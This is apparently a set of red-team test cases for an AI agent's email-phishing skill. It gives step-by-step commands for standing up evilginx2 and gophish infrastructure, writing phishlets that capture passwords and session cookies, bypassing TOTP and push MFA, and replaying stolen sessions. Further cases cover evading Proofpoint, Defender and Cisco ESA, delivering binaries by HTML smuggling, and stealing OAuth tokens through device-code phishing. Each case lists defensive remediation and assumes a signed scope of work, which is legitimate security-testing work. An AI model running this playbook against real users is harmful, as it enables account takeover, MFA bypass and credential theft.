# Email Security Deep — Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by campaign phase.
> All commands assume lawful authorization: signed SoW naming target recipients, sender identities, test window, and data-handling requirements for captured credentials/sessions. Unscoped phishing is a crime in most jurisdictions.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Infrastructure Stand-up | 2 | HIGH - CRITICAL |
| B. AiTM / MFA Bypass | 3 | HIGH - CRITICAL |
| C. Gateway Evasion | 3 | MEDIUM - HIGH |
| D. Sender Reputation | 1 | MEDIUM |
| E. Payload Delivery & Telemetry | 2 | HIGH - CRITICAL |
| F. FIDO2 Resistance & Pivot | 1 | HIGH |
| **Total** | **12** | **MEDIUM - CRITICAL** |

---

## A. Infrastructure Stand-up

### TC-ED-001: Phishing Infrastructure Stand-up Validation

| Field | Value |
|------|-----|
| **ID** | TC-ED-001 |
| **Name** | Phishing Infrastructure Stand-up Validation |
| **Severity** | HIGH |
| **Category** | Infrastructure Stand-up |
| **Objective** | Validate that the full phishing stack (gophish + evilginx2 + DNS + TLS + redirector) is operational before campaign launch, so a Phase-1 infrastructure failure does not waste campaign budget or expose infra issues mid-campaign. |
| **Prerequisites** | Authorized VPS with public IP; registered `<phish-domain>` with DNS control; signed SoW; evilginx2 binary built; gophish binary downloaded. |
| **Tools** | evilginx2, gophish, dig, openssl, curl |
| **Test Steps** | 1. Verify DNS A record resolves: `dig +short login.<phish-domain>` should return VPS IP<br>2. Verify MX record: `dig MX <phish-domain>`<br>3. Verify SPF/DKIM/DMARC TXT records are present for the look-alike domain<br>4. Launch evilginx2: `sudo ./bin/evilginx -p phishlets -d`; run `config domain <phish-domain>` and `config ip <vps_ip>`<br>5. Enable O365 phishlet: `phishlets hostname office365 login.<phish-domain>; phishlets enable office365`<br>6. Verify TLS cert was issued (ACME): `openssl s_client -connect login.<phish-domain>:443 -servername login.<phish-domain> \| openssl x509 -noout -subject -dates`<br>7. Generate lure URL: `lures create office365; lures get-url 0`<br>8. Launch gophish: `./gophish`; verify web UI on `https://127.0.0.1:3333` via SSH tunnel<br>9. Verify redirector (if used): `curl -I https://<redirector-domain>/` should 302 to `login.<phish-domain>`<br>10. Smoke-test the full flow with a test victim mailbox (authorized) |
| **Expected Results** | DNS resolves correctly; TLS cert valid; evilginx2 lists `office365` as enabled; lure URL is reachable and serves the proxied O365 login page; gophish web UI is accessible; redirector (if used) returns 302 to landing. |
| **False Positive Risk** | LOW — failures are concrete (DNS NXDOMAIN, TLS handshake error, evilginx2 phishlet errors). TLS issuance may fail if DNS has not propagated; allow 5-15 min after DNS change. |
| **Remediation (defense)** | N/A — this is offensive infra validation. For defense: gateway-side detection of look-alike TLS certs (Certificate Transparency log monitoring) catches new infra at stand-up. |
| **Cleanup** | Disable phishlet: `phishlets disable office365`; stop gophish; tear down DNS if engagement complete. |
| **References** | SKILL.md Phase 2; payloads.md Sections 1, 4; `skills/email-protocol-attack/SKILL.md` (mail-auth fundamentals) |

### TC-ED-002: evilginx2 Phishlet Authoring & Capture Validation

| Field | Value |
|------|-----|
| **ID** | TC-ED-002 |
| **Name** | evilginx2 Phishlet Authoring & Capture Validation |
| **Severity** | CRITICAL |
| **Category** | Infrastructure Stand-up |
| **Objective** | Author a custom evilginx2 phishlet for a target service and validate it captures the expected credentials + session cookies against a test account (authorized). |
| **Prerequisites** | Authorized test account on the target service; evilginx2 operational; understanding of target service's auth flow (cookie names, post-body fields). |
| **Tools** | evilginx2, browser dev tools, Burp Suite (for traffic inspection) |
| **Test Steps** | 1. Capture the legitimate auth flow with Burp — note cookie names set on success, post-body field names for username/password/code<br>2. Draft phishlet YAML: define `proxy_hosts`, `auth_tokens` (cookie names), `credentials` (post-body field names), `login` (domain/path)<br>3. Place phishlet in `phishlets/` directory<br>4. Restart evilginx2 and load phishlet: `phishlets load <name>`<br>5. Enable phishlet and bind to subdomain<br>6. Generate lure URL; visit in test browser<br>7. Complete login with authorized test account<br>8. Verify credential capture: `sessions` shows username/password<br>9. Verify session capture: `sessions 0` lists expected auth tokens<br>10. Verify session replay: import captured cookies into fresh browser profile via Cookie Quick Manager; navigate to target service; confirm logged-in as test user |
| **Expected Results** | Phishlet loads without error; lure URL serves proxied login page; test login completes; credential fields captured; auth-token cookies captured; session cookie replay succeeds (fresh browser is logged in as victim). |
| **False Positive Risk** | MEDIUM — auth-token capture may include transient tokens (CSRF, anti-replay) that do not enable session replay. Validate by replay, not by capture alone. |
| **Remediation (defense)** | Conditional Access "require compliant device" defeats session replay even when cookies are captured. FIDO2 platform authenticator defeats AiTM entirely. |
| **Cleanup** | Delete session record: `sessions delete 0`; disable phishlet: `phishlets disable <name>`. |
| **References** | SKILL.md Phase 5; payloads.md Section 1.3; payloads.md Section 14 |

---

## B. AiTM / MFA Bypass

### TC-ED-003: AiTM MFA Bypass — TOTP

| Field | Value |
|------|-----|
| **ID** | TC-ED-003 |
| **Name** | AiTM MFA Bypass against TOTP-Protected Account |
| **Severity** | CRITICAL |
| **Category** | AiTM / MFA Bypass |
| **Objective** | Demonstrate that evilginx2 AiTM captures both the TOTP code and the session cookie when the victim completes TOTP-based MFA through the proxy. Confirms TOTP alone does not prevent session theft. |
| **Prerequisites** | Authorized test O365 (or Google Workspace) account with TOTP MFA enabled; evilginx2 with O365/Google phishlet operational; authorized recipient. |
| **Tools** | evilginx2, test browser, TOTP app (for test account) |
| **Test Steps** | 1. Configure test account with TOTP MFA (Authy/Google Authenticator)<br>2. Generate evilginx2 lure URL<br>3. In test browser, navigate to lure URL<br>4. Submit test credentials on proxied login page<br>5. When MFA prompt appears, enter current TOTP from test app<br>6. Observe evilginx2 captures username, password, AND TOTP code (live)<br>7. After login completes, observe evilginx2 captures auth-token cookies<br>8. Import cookies into fresh browser; confirm logged-in as victim WITHOUT re-entering TOTP |
| **Expected Results** | TOTP is captured live (useless post-expiry, but confirms MFA step is reached); auth-token cookies are captured; session cookie replay succeeds. Demonstrates TOTP alone is insufficient. |
| **False Positive Risk** | LOW — TOTP is time-bound; the captured TOTP is not reusable, but the *session cookie* is. Validate by session replay. |
| **Remediation (defense)** | Replace TOTP with FIDO2 platform authenticator (evilginx2 cannot capture WebAuthn assertion bound to legitimate origin). Implement conditional access requiring compliant device. |
| **Cleanup** | Delete captured session from evilginx2; revoke test account's active sessions in admin portal. |
| **References** | SKILL.md Phase 5; payloads.md Section 1.4 |

### TC-ED-004: AiTM MFA Bypass — Push (Number Matching)

| Field | Value |
|------|-----|
| **ID** | TC-ED-004 |
| **Name** | AiTM MFA Bypass against Push MFA (Microsoft Authenticator) |
| **Severity** | CRITICAL |
| **Category** | AiTM / MFA Bypass |
| **Objective** | Demonstrate that evilginx2 AiTM captures the session cookie when victim approves a push MFA (e.g., Microsoft Authenticator number-matching). Confirms push MFA does not prevent session theft. |
| **Prerequisites** | Authorized test account with push MFA; evilginx2 operational; test user with Microsoft Authenticator enrolled. |
| **Tools** | evilginx2, test browser, test mobile device with Authenticator |
| **Test Steps** | 1. Configure test account with push MFA<br>2. Generate lure URL; test victim navigates<br>3. Victim submits credentials on proxied page<br>4. Push notification fires on test mobile device<br>5. Victim approves (enter number matching on device, if prompted)<br>6. evilginx2 captures session cookies post-approval<br>7. Import cookies into fresh browser; confirm logged in |
| **Expected Results** | Push approval completes through proxy; session cookies captured; replay succeeds. Push MFA, like TOTP, is insufficient on its own. |
| **False Positive Risk** | LOW — push MFA does not bind the assertion to a specific origin/device, so the captured session is fully transportable. |
| **Remediation (defense)** | FIDO2 platform authenticator. Conditional Access with compliant-device + application enforcement. Phishing-resistant MFA category. |
| **Cleanup** | Delete captured session; revoke test account sessions. |
| **References** | SKILL.md Phase 5; payloads.md Section 1.4 |

### TC-ED-005: FIDO2 Resistance — AiTM Failure Validation

| Field | Value |
|------|-----|
| **ID** | TC-ED-005 |
| **Name** | FIDO2 Resistance — AiTM Failure and Detection |
| **Severity** | HIGH |
| **Category** | AiTM / MFA Bypass |
| **Objective** | Demonstrate that FIDO2 (WebAuthn platform authenticator) defeats evilginx2 AiTM — no session cookie captured, and the campaign detects FIDO2 presence in-browser (for pivot decision). |
| **Prerequisites** | Authorized test account with FIDO2 platform authenticator (Touch ID, Windows Hello, security key); evilginx2 with FIDO2-detection JS injected. |
| **Tools** | evilginx2, browser with FIDO2 support, test security key |
| **Test Steps** | 1. Configure test account with FIDO2 platform authenticator<br>2. Inject FIDO2-detection JS (see payloads.md Section 14.1) into phishlet<br>3. Test victim navigates to lure URL<br>4. Browser-detection fires: `isUserVerifyingPlatformAuthenticatorAvailable()` returns true<br>5. C2 logs `fido2_detected` event<br>6. Victim submits credentials; FIDO2 prompt appears<br>7. FIDO2 assertion fails (origin mismatch — evilginx2 domain != legitimate origin)<br>8. evilginx2 does NOT capture a session cookie<br>9. Validate C2 has the `fido2_detected` beacon for this victim |
| **Expected Results** | FIDO2 detection fires; FIDO2 prompt fails to complete through proxy; no session cookie captured; C2 has beacon for pivot decision. This is the correct defensive outcome. |
| **False Positive Risk** | LOW — FIDO2 failure is binary (assertion verifies or not). Browser-support detection has false negatives on legacy browsers; verify in modern Chrome/Safari/Edge/Firefox. |
| **Remediation (defense)** | Mandate FIDO2 for privileged roles. Document FIDO2 rollout coverage; uniform deployment prevents attacker cherry-picking non-FIDO2 accounts. |
| **Cleanup** | Delete beacon log; disable phishlet. |
| **References** | SKILL.md Phase 5; payloads.md Section 14; `skills/cloud-identity-attack/SKILL.md` |

---

## C. Gateway Evasion

### TC-ED-006: Proofpoint URL Defense Bypass Test

| Field | Value |
|------|-----|
| **ID** | TC-ED-006 |
| **Name** | Proofpoint URL Defense Bypass Test |
| **Severity** | HIGH |
| **Category** | Gateway Evasion |
| **Objective** | Test whether URLs in delivered mail are rewritten by Proofpoint URL Defense and whether look-alike domains escape rewriting (Tenant Allow/Block List exemption). |
| **Prerequisites** | Authorized probe mailbox on target's tenant; target confirmed to use Proofpoint; sender reputation warm-up complete. |
| **Tools** | swaks, evilginx2 lure URL, receiving-side mail access |
| **Test Steps** | 1. Send probe mail with embedded URL: `swaks --to probe@target.com --from test@<phish-domain> --body '<a href="https://login.<phish-domain>/test">click</a>' --header "Content-Type: text/html"`<br>2. Receive mail at probe mailbox<br>3. Inspect body: was URL rewritten to `urldefense.proofpoint.com/v2/url?u=...`? Capture rewritten URL<br>4. Click rewritten URL — does it resolve to original, or does it present a warning/block page?<br>5. Test multiple look-alike domains to identify any that escape rewriting<br>6. Test encrypted-zip attachment (Proofpoint cannot unzip without password) — verify it passes through |
| **Expected Results** | Most URLs are rewritten; click-time check denies recently-flagged domains. Some look-alikes may escape rewriting if Tenant Allow list is over-permissive. Encrypted-zip bypasses sandbox detonation. |
| **False Positive Risk** | MEDIUM — Proofpoint occasionally does not rewrite URLs in certain header configurations (e.g., bare-URL in plain-text body); confirm by sending multiple formats. |
| **Remediation (defense)** | Enforce click-time URL reputation across all domains (no allow-list exemptions for non-essential domains). Sandbox encrypted archives via password-prompt-on-quarantine workflow. |
| **Cleanup** | Delete probe mail from victim mailbox; clean beacon server logs. |
| **References** | SKILL.md Phase 3; payloads.md Section 6 |

### TC-ED-007: Microsoft Defender Safe Links + Safe Attachments Test

| Field | Value |
|------|-----|
| **ID** | TC-ED-007 |
| **Name** | Microsoft Defender Safe Links & Safe Attachments Bypass Test |
| **Severity** | HIGH |
| **Category** | Gateway Evasion |
| **Objective** | Test Defender Safe Links URL rewriting + Safe Attachments sandbox detonation. Identify payloads that bypass both. |
| **Prerequisites** | Authorized O365 test tenant with Defender for Office P1/P2 licensed; probe mailbox; payload staging host. |
| **Tools** | swaks, payload generator (HTML smuggling sample), Defender tenant access |
| **Test Steps** | 1. Send probe mail with URL: `swaks --to probe@target.com --body '<a href="https://<phish-domain>/test">link</a>' --header "Content-Type: text/html"`<br>2. Receive at probe mailbox; inspect body for `*.safelinks.protection.outlook.com/?url=` rewrite<br>3. Click rewritten URL; observe behavior (allow / warn / block / isolation)<br>4. Send second probe with HTML-smuggling attachment (see payloads.md Section 12.1)<br>5. Receive; observe whether Safe Attachments delivers, swaps in dynamic-delivery placeholder, or quarantines<br>6. If delivered, victim opens attachment; verify HTML smuggling reconstructs binary client-side<br>7. Send third probe with encrypted-zip attachment (password out-of-band)<br>8. Observe delivery outcome |
| **Expected Results** | URLs are rewritten; click-time check applies. HTML-smuggling attachments may pass sandbox (only HTML/JS visible). Encrypted-zip passes (cannot unzip without password). Sandbox-aware payloads that detect VM may detonate on real victim only. |
| **False Positive Risk** | MEDIUM — Defender sandbox logic evolves; test against current tenant presets. Some "Dynamic Delivery" modes mask delivery outcome. |
| **Remediation (defense)** | Enable "Detonation in sandbox" for ALL attachment types including HTML/JS. Block encrypted archives by default; allow via exception workflow. Tenant Allow/Block list review quarterly. |
| **Cleanup** | Delete probe mail; quarantine any sandbox-evading payload evidence. |
| **References** | SKILL.md Phase 3; payloads.md Section 9 |

### TC-ED-008: Cisco ESA Mail Policy Bypass Test

| Field | Value |
|------|-----|
| **ID** | TC-ED-008 |
| **Name** | Cisco ESA Mail Policy Bypass Test |
| **Severity** | MEDIUM |
| **Category** | Gateway Evasion |
| **Objective** | Test whether Cisco ESA applies different mail policies to internal-spoofed vs external senders, and whether attachment-type allowlists permit risky extensions (`.iso`, `.lnk`). |
| **Prerequisites** | Authorized test environment with Cisco ESA; ability to spoof an internal sender (depends on SPF — see `email-protocol-attack`); probe mailbox. |
| **Tools** | swaks, file generator for risky extensions |
| **Test Steps** | 1. Send external-sender probe: `swaks --to probe@target.com --from external@external.com --body test --server mail.target.com`<br>2. Send internal-spoofed probe: `swaks --to probe@target.com --from internal@target.com --body test --server mail.target.com`<br>3. Compare `X-IronPort-*` headers; if internal-spoofed has fewer anti-spam headers, policy bypass exists<br>4. Send probes with attachments of various extensions: `.exe`, `.iso`, `.lnk`, `.hta`, `.html`<br>5. Observe which extensions are blocked, sandboxed, or allowed<br>6. Test header injection abuse (malformed X-headers) |
| **Expected Results** | If internal-spoofed mail bypasses ESA scan, policy bypass confirmed (often paired with weak SPF enforcement). Some attachment types may pass (varies by policy). |
| **False Positive Risk** | MEDIUM — ESA policy config varies widely per org; do not assume defaults. |
| **Remediation (defense)** | Apply uniform inbound scan policy regardless of sender (internal/external). Enforce SPF strictly on internal domain (reject soft-fail). Block `.iso`, `.img`, `.lnk`, `.hta` by default. |
| **Cleanup** | Delete probe mail; ensure no orphaned attachments remain in quarantine. |
| **References** | SKILL.md Phase 3; payloads.md Section 8; `skills/email-protocol-attack/SKILL.md` (SPF fundamentals) |

---

## D. Sender Reputation

### TC-ED-009: Sender Reputation Warm-up & Spoofing Success Audit

| Field | Value |
|------|-----|
| **ID** | TC-ED-009 |
| **Name** | Sender Reputation Warm-up & Spoofing Success Audit |
| **Severity** | MEDIUM |
| **Category** | Sender Reputation |
| **Objective** | Validate that warm-up + SPF/DKIM/DMARC/BIMI/ARC alignment for the look-alike domain produces gateway-trusted delivery, and audit the client's posture from the attacker's perspective. |
| **Prerequisites** | Look-alike domain with DNS control; new sending IP; ESP or self-hosted SMTP; checkdmarc/espoofer tools. |
| **Tools** | checkdmarc, espoofer, dig, MailSpoof, sending IP warm-up schedule |
| **Test Steps** | 1. Configure DNS for look-alike: SPF (`v=spf1 ip4:<vps_ip> -all`), DKIM (1024+ bit), DMARC (`v=DMARC1; p=none; rua=mailto:...`)<br>2. Add BIMI: `default._bimi.<phish-domain>. IN TXT "v=BIMI1;l=...;a=..."`<br>3. Configure ARC on outbound signing (if forwarding)<br>4. Begin IP warm-up: 10 msgs/hr Day 1, ramping to full volume by Day 14 (see payloads.md Section 10.4)<br>5. Monitor blacklists: `for bl in zen.spamhaus.org bl.spamcop.net b.barracudacentral.org; do reversed=$(echo $IP \| awk -F. '{print $4"."$3"."$2"."$1}'); dig +short $reversed.$bl A; done`<br>6. Audit client posture: `checkdmarc target.com`<br>7. Test spoofing success: `python3 espoofer.py -i test_email.txt --spoof <phish-domain>`<br>8. Measure deliverability: send 100 probe mails to test recipient; count inbox vs spam folder placement |
| **Expected Results** | Look-alike passes SPF/DKIM/DMARC for ITS OWN identity (not the real Microsoft — that requires actual compromise). Reputation ramps over warm-up period. Spoofing of the real target domain fails if target enforces strict DMARC `p=reject`. |
| **False Positive Risk** | MEDIUM — IP warm-up is stochastic; some destinations ramp faster than others. BIMI may require VMC from CA (cost/time). |
| **Remediation (defense)** | Strict DMARC (`p=reject`) on the legitimate domain. Monitor Certificate Transparency for look-alike TLS certs. Monitor domain registration for typosquats (brand-protection service). |
| **Cleanup** | Tear down DNS; retire sending IP; archive rua reports. |
| **References** | SKILL.md Phase 2-3; payloads.md Section 10; `skills/email-protocol-attack/SKILL.md` |

---

## E. Payload Delivery & Telemetry

### TC-ED-010: HTML Smuggling Payload Delivery

| Field | Value |
|------|-----|
| **ID** | TC-ED-010 |
| **Name** | HTML Smuggling Payload Delivery (Gateway Sandbox Evasion) |
| **Severity** | CRITICAL |
| **Category** | Payload Delivery |
| **Objective** | Demonstrate that HTML smuggling (gateway sees only HTML/JS; binary reconstructed client-side) bypasses attachment sandbox detonation across major gateways. |
| **Prerequisites** | Authorized target mailbox; HTML smuggling payload (test binary, not real malware); payload staging host; evilginx2 or gophish infra. |
| **Tools** | swaks or gophish, HTML smuggling template, payload staging host |
| **Test Steps** | 1. Build test binary (e.g., simple executable that logs to file)<br>2. Base64-encode: `base64 test_binary > test_binary.b64`<br>3. Embed in HTML smuggling template (see payloads.md Section 12.1)<br>4. Send as attachment via gophish or swaks<br>5. Receive at probe mailbox; verify attachment delivered (not quarantined)<br>6. Open attachment in test browser; verify binary downloads<br>7. Cross-reference: was the binary ever observed by the gateway sandbox? Check gateway logs |
| **Expected Results** | HTML/JS attachment passes sandbox detonation (no malicious content visible to sandbox). Binary reconstructs client-side in victim's browser. Sandbox logs do NOT show binary detonation. |
| **False Positive Risk** | LOW — HTML smuggling is well-understood; sandbox evasion is the design goal. Modern sandboxes with JS execution may catch; test against current gateway. |
| **Remediation (defense)** | Sandbox with full JS execution. Block `.html`/`.htm` attachments from external senders by default. Mark external mail with `[External]` banner. |
| **Cleanup** | Delete delivered attachment; shred reconstructed binary. |
| **References** | SKILL.md Phase 4; payloads.md Section 12.1 |

### TC-ED-011: Post-Click Telemetry & Campaign Funnel Report

| Field | Value |
|------|-----|
| **ID** | TC-ED-011 |
| **Name** | Post-Click Telemetry & Campaign Funnel Report Generation |
| **Severity** | HIGH |
| **Category** | Payload Delivery |
| **Objective** | Validate that the campaign correctly tracks the full funnel (sent → delivered → opened → clicked → credential-captured → session-captured → fido2-blocked) and produces a metrics report. |
| **Prerequisites** | gophish campaign launched; evilginx2 operational; beacon endpoints live; reporting database. |
| **Tools** | gophish API, evilginx2 sessions dump, beacon server, Python pandas |
| **Test Steps** | 1. Confirm gophish campaign launched (TC-ED-001 prereq)<br>2. Pull gophish results: `curl -k https://localhost:3333/api/campaigns/1/results?api_key=$KEY \| jq '.'`<br>3. Pull evilginx2 sessions: `sudo ./bin/evilginx -p phishlets -d -c 'sessions; exit'`<br>4. Pull beacon server events (open, click, fido2_detected, c2_register)<br>5. Merge on victim email/username<br>6. Build funnel counts: sent / delivered / opened / clicked / cred-captured / session-captured / fido2-blocked<br>7. Generate per-victim timeline<br>8. Produce funnel report CSV/HTML |
| **Expected Results** | All events captured end-to-end. Funnel shows realistic drop-off at each stage. Per-victim timeline shows the click → cred → session sequence within expected timeframes. |
| **False Positive Risk** | LOW — telemetry is deterministic. Mismatched events indicate beacon/evilginx2 misconfiguration. |
| **Remediation (defense)** | Detection of campaign-pattern telemetry (correlated opens + clicks from same victim in short window) can flag AiTM campaigns even when individual signals look benign. |
| **Cleanup** | Archive telemetry per SoW; destroy raw credential/session data; keep only aggregate metrics for final report. |
| **References** | SKILL.md Phase 6; payloads.md Section 13 |

---

## F. FIDO2 Resistance & Pivot

### TC-ED-012: FIDO2 Pivot — Device-Code Flow Phishing

| Field | Value |
|------|-----|
| **ID** | TC-ED-012 |
| **Name** | FIDO2 Pivot via Device-Code Flow Phishing |
| **Severity** | HIGH |
| **Category** | FIDO2 Pivot |
| **Objective** | When AiTM fails against FIDO2-protected accounts, pivot to device-code flow phishing (still passes MFA at the legitimate login; attacker receives device token). Validate the pivot works AND that the client's training/controls detect it. |
| **Prerequisites** | Authorized O365/Azure AD test tenant; test user with FIDO2 enrolled; evilginx2 confirmed failing; device-code-flow phish page prepared. |
| **Tools** | Azure AD device-code flow (`POST /common/oauth2/devicecode`), custom phish page, beacon server |
| **Test Steps** | 1. Request device code: `curl -X POST 'https://login.microsoftonline.com/common/oauth2/devicecode?client_id=<app_id>&resource=https://graph.microsoft.com'` — returns `user_code`, `device_code`, `verification_url`<br>2. Phish page presents user_code and asks victim to visit `microsoft.com/devicelogin` and enter code<br>3. Victim (with FIDO2) completes legitimate device-code flow at the REAL Microsoft login — FIDO2 passes<br>4. Poll for token: `curl -X POST 'https://login.microsoftonline.com/common/oauth2/token' -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=<app_id>&device_code=<device_code>"`<br>5. Receive access_token + refresh_token on behalf of victim<br>6. Use token to access victim's data per engagement scope<br>7. Validate client-side detection: does the client's training/CA detect the suspicious device-code flow? |
| **Expected Results** | Device-code flow succeeds even with FIDO2 (FIDO2 binds assertion to origin — device-code flow doesn't have an attacker origin in the user's browser). Attacker receives valid token. |
| **False Positive Risk** | LOW — device-code flow is well-documented bypass. Modern Azure AD tenants with "conditional access — require compliant device for device-code flow" can mitigate. |
| **Remediation (defense)** | Conditional Access policy: block device-code flow for non-emergency scenarios. User training: refuse unsolicited device-code prompts. Monitor Azure AD sign-in logs for `authenticationProtocol: deviceCode` from unexpected IPs. |
| **Cleanup** | Revoke the device token in Azure AD; delete phish page; shred captured token. |
| **References** | SKILL.md Phase 5; payloads.md Section 14.2; `skills/cloud-identity-attack/SKILL.md` |

---

## Severity Summary

| Severity | Count | Test Cases |
|----------|-------|------------|
| CRITICAL | 4 | TC-ED-002, TC-ED-003, TC-ED-004, TC-ED-010 |
| HIGH | 6 | TC-ED-001, TC-ED-005, TC-ED-006, TC-ED-007, TC-ED-011, TC-ED-012 |
| MEDIUM | 2 | TC-ED-008, TC-ED-009 |
| **Total** | **12** | TC-ED-001 through TC-ED-012 |

## Authorization Reminder

Every test case above assumes a signed Statement of Work that names:
- Target recipients (or probe mailboxes only)
- Sender identities (`<phish-domain>` and from-addresses)
- Test window (start/end timestamps)
- Data-handling requirements (capture scope, storage, destruction timeline)
- Approved pivots (e.g., is device-code phishing in scope, or only AiTM?)
- Emergency abort contact at the client

If any of these is missing, **DO NOT PROCEED**. Phishing infra is high-risk; unscoped operations cause real harm and may constitute a crime under US CFAA, UK Computer Misuse Act, EU equivalents. When in doubt, escalate to `skills/engagement-manager/`.
